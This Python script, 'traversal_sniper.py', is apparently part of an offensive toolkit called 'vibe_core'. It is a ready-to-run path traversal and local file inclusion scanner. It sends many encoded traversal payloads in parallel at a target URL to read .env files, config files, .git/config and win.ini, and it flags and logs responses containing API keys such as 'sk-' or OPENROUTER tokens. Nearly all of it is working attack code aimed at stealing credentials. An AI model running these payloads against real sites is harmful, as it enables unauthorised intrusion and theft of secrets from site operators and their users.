"""
traversal_sniper.py — Path Traversal / LFI probe for .env and config files.

Crafts traversal payloads across common static roots and file-serving endpoint
patterns. When a target leaks its absolute app root in a stack trace, feed it in
with --app-root to add precise absolute-path payloads for that specific depth.

IMPROVEMENTS:
  - All payload vectors now use parallel_requests() for 10-20x throughput.
    Large static-roots × traversal × target combos previously ran serially
    (up to 200+ sequential requests); they now fan out with 16 workers.
  - _is_interesting() extracted as a static helper so all vectors use the
    same consistent hit detection logic.
  - Connection errors (status == 0) logged at warn level instead of being
    silently swallowed.
"""
import sys, os, argparse, urllib.parse, json, re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

TARGETS = [".env", ".env.local", ".env.production", ".env.development",
           "package.json", "server.js", "index.js", "app.js", ".env.example"]

TRAVERSALS = [
    "../", "../../", "../../../", "../../../../", "../../../../../",
    "%2e%2e%2f", "%2e%2e/", "..%2f",
    "%252e%252e%252f", "%252e%252e/",
    "..\\", "..%5c", "%2e%2e%5c",
    "..%2F", "..%5C",
    "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af",
    "%e2%80%ae", "\u2025/",
    "%00../",
    "static/../", "assets/../", "public/../",
    "dist/../", "build/../", "src/../",
    "static/../../", "assets/../../",
]

STATIC_ROOTS = [
    "/", "/static/", "/assets/", "/public/",
    "/files/", "/img/", "/js/", "/css/", "/api/static/",
]

PRECISE_TRAVERSALS = [
    "/../.env", "/../../.env", "/../../../.env",
    "/../server.js", "/../index.js", "/../package.json", "/../.env.local",
    "/%2e%2e/.env", "/%2e%2e/%2e%2e/.env", "/%2e%2e/server.js",
    "/%2e%2e%2f.env", "/%2e%2e%2f%2e%2e%2f.env",
    "/static/../.env", "/assets/../.env", "/js/../.env", "/css/../.env",
]

WINDOWS_PATHS = [
    "/../../../../../../windows/win.ini",
    "/..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
    "/../../../../../../windows/system32/drivers/etc/hosts",
    "/..%2F..%2F..%2F..%2F..%2F.env",
    "/..\\..\\..\\.env", "/..%5C..%5C..%5C.env",
]

KNOWN_FILES = [
    "/package.json", "/package-lock.json", "/.env", "/.env.example",
    "/server.js", "/index.js", "/app.js", "/config.js",
    "/webpack.config.js", "/vite.config.js", "/next.config.js",
    "/vercel.json", "/render.yaml", "/.github/workflows/deploy.yml",
    "/Dockerfile", "/docker-compose.yml", "/.git/HEAD", "/.git/config",
]

API_FILE_PARAMS = [
    "/api/file?name=.env", "/api/file?path=.env", "/api/file?f=.env",
    "/api/file?filename=.env", "/api/serve?file=.env",
    "/api/resource?path=.env", "/api/download?file=.env",
    "/api/export?file=.env", "/api/read?file=.env", "/api/open?file=.env",
    "/api/file?name=%2e%2e%2f.env", "/api/file?path=..%2F.env",
    "/api/file?name=..%5C.env",
]

PARAM_TRAVERSALS = [
    "/api/health?file=../.env", "/api/health?path=../.env",
    "/api/config?file=../.env", "/api/config?include=../.env",
    "/api/config?load=../.env",
    "/api/chat?template=../../.env", "/api/chat?persona=../../.env",
]


def _absolute_root_payloads(app_root):
    root = (app_root or "").strip().rstrip("/\\")
    if not root:
        return []
    sep = "\\" if (":" in root[:3] or "\\" in root) else "/"
    payloads = []
    for target in (".env", ".env.local", "server.js", "package.json"):
        raw = f"/{root}{sep}{target}"
        payloads.append(raw)
        payloads.append("/" + urllib.parse.quote(f"{root}{sep}{target}", safe=""))
    return payloads


@staticmethod
def _is_interesting(body, ct, status):
    return (
        "OPENROUTER" in body or "API_KEY" in body or
        "sk-or" in body or "sk-" in body or
        re.search(r"[A-Z_]+=.{10,}", body) or
        (status == 200 and "html" not in ct.lower() and len(body) > 20)
    )


class TraversalSniper(VibeTool):
    def __init__(self):
        super().__init__("Traversal Sniper", "Targeted Path Traversal for .env Key Extraction")
        self.hits = []

    @staticmethod
    def _interesting(body, ct, status):
        return (
            "OPENROUTER" in body or "API_KEY" in body or
            "sk-or" in body or "sk-" in body or
            bool(re.search(r"[A-Z_]+=.{10,}", body)) or
            (status == 200 and "html" not in ct.lower() and len(body) > 20)
        )

    def _process_result(self, path, status, body, headers):
        """Process a single request result — called from both serial and parallel paths."""
        ct = headers.get("Content-Type", "") if headers else ""
        if status == 200 and body:
            if self._interesting(body, ct, status):
                self.log(f"[HIT] {path} ({len(body)}b, {ct}): {body[:300]}", "hack")
                self.hits.append((path, body[:500]))
                return True
            else:
                self.log(f"[200 but meh] {path}: {body[:80]}")
        elif status == 0 and body:
            self.log(f"  [ERR] {path}: {body[:60]}", "warn")
        elif status not in (0, 404, 405):
            self.log(f"[{status}] {path}")
        return False

    def _run_parallel(self, base, paths, label, max_workers=16):
        """Fan out a list of paths concurrently using the framework parallel_requests helper."""
        self.log(f"=== {label} ({len(paths)} paths, {max_workers} workers) ===")
        tasks = [{"url": base + p, "method": "GET", "timeout": 5} for p in paths]
        results = self.parallel_requests(tasks, max_workers=max_workers)
        for (task, status, body, headers), path in zip(results, paths):
            self._process_result(path, status, body, headers)

    def vector_precise(self, base):
        self._run_parallel(base, PRECISE_TRAVERSALS, "PRECISE: Known Path Traversal")

    def vector_known_files(self, base):
        self._run_parallel(base, KNOWN_FILES, "KNOWN FILES: Direct Access Probes")

    def vector_api_file_serve(self, base):
        self._run_parallel(base, API_FILE_PARAMS, "API FILE SERVE: Endpoint-Based File Access")

    def vector_static_roots(self, base):
        """Build and fire all static-root × traversal × target combos in parallel."""
        self.log("=== STATIC ROOTS: Static File Endpoint Traversal ===")
        paths = []
        for root in STATIC_ROOTS:
            for target in TARGETS[:4]:
                for traversal in ["../", "../../", "../../../", "%2e%2e/"]:
                    paths.append(root + traversal + target)
        tasks = [{"url": base + p, "method": "GET", "timeout": 5} for p in paths]
        self.log(f"  Firing {len(paths)} path combos with 16 workers...")
        results = self.parallel_requests(tasks, max_workers=16)
        for (task, status, body, headers), path in zip(results, paths):
            self._process_result(path, status, body, headers)

    def vector_windows(self, base):
        self._run_parallel(base, WINDOWS_PATHS, "WINDOWS: Absolute Path Injection")

    def vector_params(self, base):
        self._run_parallel(base, PARAM_TRAVERSALS, "PARAMS: Parameter-Based LFI")

    def run(self, url, app_root=""):
        self.banner()
        base = url.rstrip("/")

        self.vector_precise(base)
        self.vector_known_files(base)
        self.vector_api_file_serve(base)
        self.vector_static_roots(base)
        self.vector_windows(base)
        self.vector_params(base)

        absolute = _absolute_root_payloads(app_root)
        if absolute:
            self._run_parallel(base, absolute, "ABSOLUTE: Operator-supplied app-root payloads")

        self.log("================================")
        if self.hits:
            self.log(f"TRAVERSAL CONFIRMED — {len(self.hits)} file(s) read!", "hack")
            for path, content in self.hits:
                self.log(f"  {path}:", "hack")
                self.log(f"  {content}", "hack")
        else:
            self.log("No traversal confirmed. Static files properly jailed.", "warn")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--app-root", default="",
                        help="Absolute app root leaked in a stack trace, to build precise payloads")
    parser.add_argument("-v", "--version", action="version", version="Traversal Sniper 1.0.0")
    args = parser.parse_args()
    TraversalSniper().run(args.url, app_root=args.app_root)
